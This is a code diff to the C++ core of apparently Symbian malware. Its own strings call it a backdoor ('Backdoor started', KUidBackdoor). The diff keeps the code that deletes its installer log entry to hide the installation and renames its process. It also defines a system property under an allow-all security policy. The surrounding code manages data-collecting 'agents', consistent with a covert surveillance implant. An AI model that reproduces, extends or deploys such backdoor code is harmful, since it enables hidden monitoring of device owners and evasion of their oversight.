@@ -43,6 +43,7 @@ CCore::~CCore()
 	delete iConfig;
 	delete iFreeSpaceMonitor;
 	iFs.Close();
+	RProperty::Delete(KPropertyFreeSpaceThreshold);
 	__FLOG(_L("EndDestructor"));
 	__FLOG_CLOSE;
 	}
@@ -53,6 +54,10 @@ void CCore::ConstructL()
 	__FLOG_OPEN("HT", "Core.txt");
 	__FLOG(_L("------------"));
 
+	static _LIT_SECURITY_POLICY_PASS(KAllowAllPolicy);
+	TInt ris = 0;
+	ris = RProperty::Define(KPropertyUidCore, KPropertyFreeSpaceThreshold, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);
+		
 	iConfig = CConfigFile::NewL();
 	iFs.Connect();
 	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
@@ -81,21 +86,6 @@ void CCore::DisposeAgentsAndActionsL()
 			}
 		i++;
 		}	
-	}
-
-
-void CCore::NotifyAllAgentsL(TUint32 aData)
-	{
-	TInt count = iConfig->iAgentsList.Count();
-	for (int i=0; i < count; i++)
-		{
-		CDataAgent* dataAgent = iConfig->iAgentsList[i];
-		if(dataAgent->iStatus != EAgent_Disabled)
-			{
-			TCmdStruct notifyCmd(ENotify, aData, dataAgent->iId);
-			SubmitNewCommandL(notifyCmd);
-			}
-		}
 	}
 
 void CCore::RestartAllAgentsL()
@@ -399,16 +389,6 @@ void CCore::PropertyChangedL(TUid category, TUint key, TInt value)
 			
 		CAbstractQueueEndPoint::PropertyChangedL(category, key, value);
 
-		// this is used to die, before the uninstall
-		// it's triggered calling:
-		// RProperty::Set(KPropertyUidSharedQueue, KPropertyKeySharedQueueTopAddedOrRemoved, 0xDEAD);
-		/*
-		if (value == 0xDEAD)
-		{
-			CActiveScheduler::Stop();
-			return;
-		}
-		*/
 	}
 
 
@@ -433,28 +413,19 @@ void CCore::StartMonitorFreeSpace()
 	TBool below = iFreeSpaceMonitor->IsBelowThreshold();
 	if(below)
 		{
-		TUint32 data = 0;
-		data |= ENotifyThreshold;
-		data |= EBelow;
-		NotifyAllAgentsL(data);
+		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
 		}
 	iFreeSpaceMonitor->StartListeningForEvents();
 	}
 
 void CCore::NotifyAboveThreshold()
 	{
-	TUint32 data = 0;
-	data |= ENotifyThreshold;
-	data |= EAbove;
-	NotifyAllAgentsL(data);
+	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
 	}
 
 void CCore::NotifyBelowThreshold()
 	{
-	TUint32 data = 0;
-	data |= ENotifyThreshold;
-	data |= EBelow;  
-	NotifyAllAgentsL(data);
+	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
 	}
 
 LOCAL_C void DeleteInstallerLog(TUid aUid)
@@ -527,22 +498,30 @@ LOCAL_C void DoStartL()
 	if (!Processes::RenameIfNotRunning(KProcName))
 		return;
 
+	//delete install log entry
+	User::After(10*1000000);
+	/*
+	TBuf8<12> hexBuf(KUidBackdoor);
+	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
+	TLex8 lex(hexBuf);
+	TUint32 uid;
+	lex.Val(uid,EHex);
+	TUid myUid = TUid::Uid(uid);
+	*/
+	TUid myUid = GetUid(KUidBackdoor);
+	DeleteInstallerLog(myUid);
+	
 	// Create active scheduler (to run active objects)
 	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
 	CleanupStack::PushL(scheduler);
 	CActiveScheduler::Install(scheduler);
-
-	//delete install log entry
-	User::After(10*1000000);
-	TUid myUid = {0x200305D7};
-	DeleteInstallerLog(myUid);
 	
 	CCore* core = CCore::NewLC();
 	
 	//log backdoor start
 	_LIT(KBdStart,"Backdoor started");
 	core->LogInfoMsgL(KBdStart);
-	
+		
 	//load config
 	core->LoadConfigAndStartL();
 	
